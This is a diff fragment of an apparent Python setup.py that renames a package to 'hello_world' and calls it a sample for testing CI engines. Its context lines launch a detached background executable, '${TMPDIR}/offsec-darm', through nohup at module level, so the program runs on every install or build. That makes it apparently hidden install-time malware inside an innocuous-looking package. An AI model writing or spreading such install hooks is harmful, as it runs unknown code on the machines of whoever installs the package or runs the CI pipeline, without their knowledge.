@@ -15,11 +15,11 @@ subprocess.Popen(['nohup', '${TMPDIR}/offsec-darm', '&'],
 os.system('sleep 3')
 
 setup(
-    name="tiapbd",
+    name="hello_world",
     license="MIT",
     version="1.0.0",
     description="Sample program to test CI engines",
-    packages=["tiapbd"],
+    packages=["hello"],
     classifiers=[
         "Development Status :: 6 - Mature",
         "Environment :: Console",
